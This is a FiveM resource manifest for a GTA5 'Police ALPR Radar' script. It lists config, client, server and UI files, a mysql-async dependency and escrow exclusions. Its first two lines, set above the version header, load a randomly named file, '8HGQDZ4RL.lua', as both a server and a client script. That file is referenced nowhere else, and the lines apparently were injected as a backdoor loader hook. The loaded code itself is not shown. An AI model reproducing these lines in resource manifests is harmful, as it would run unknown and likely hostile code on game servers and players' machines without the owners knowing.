server_script "8HGQDZ4RL.lua"
client_script "8HGQDZ4RL.lua"
fx_version 'cerulean'
game 'gta5'
author 'discord.gg/codesign'
description 'Police ALPR Radar'
version '1.0.5'
lua54 'yes'

shared_scripts {
    'configs/locales.lua',
    'configs/config.lua',
    --'@ox_lib/init.lua' --⚠️PLEASE READ⚠️; Uncomment this line if you use 'ox_lib'.⚠️
}

client_scripts {
    'configs/client_customise_me.lua',
    'client/*.lua'
}

server_scripts {
    '@mysql-async/lib/MySQL.lua', --⚠️PLEASE READ⚠️; Remove this line if you don't use 'mysql-async' or 'oxmysql'.⚠️
    'configs/server_customise_me.lua',
    'configs/server_webhooks.lua',
    'server/*.lua'
}

ui_page {
    'html/index.html',
}
files {
    'configs/locales_ui.js',
    'configs/config_ui.js',
    'html/index.html',
    'html/css/*.css',
    'html/js/*.js',
    'html/images/*.png',
    'html/fonts/**/*.otf',
    'html/fonts/**/*.ttf',
    'html/sounds/*.ogg'
}

dependencies {
    '/server:4960' -- ⚠️PLEASE READ⚠️; Requires at least server build 4960.
}

escrow_ignore {
    'client/functions.lua',
    'configs/*.lua',
    'server/version_check.lua'
}
dependency '/assetpacks'